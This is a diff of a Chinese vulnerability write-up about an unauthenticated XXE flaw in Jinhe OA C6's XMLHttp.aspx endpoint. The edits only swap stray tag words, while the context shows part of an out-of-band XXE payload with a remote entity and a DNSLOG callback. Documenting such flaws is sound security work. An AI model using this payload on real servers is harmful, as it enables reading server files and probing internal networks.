@@ -8,8 +8,6 @@ asset_dir: embedded-base64
 
 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.CrmSystemSet/XMLHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
 
-脚本语言
-
 # 影响版本
 
 金和OA C6
@@ -22,11 +20,11 @@ asset_dir: embedded-base64
 
 深入探索
 
-编程
-
 软件
 
-商务软件和生产力软件
+计算机科学
+
+网络安全
 
 直接根据 `JHSoft.Web.CrmSystemSet/XMLHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.CrmSystemSet.dll` 将其进行反编译后找到 **QuickMatch** 的处理逻辑
 
@@ -58,6 +56,14 @@ Host: jhsoft.mrxn.net
 %remote;]>
 <root/>
 ```
+
+深入探索
+
+计算机服务器
+
+编程
+
+网络安全
 
 在DNSLOG平台成功收到请求
 
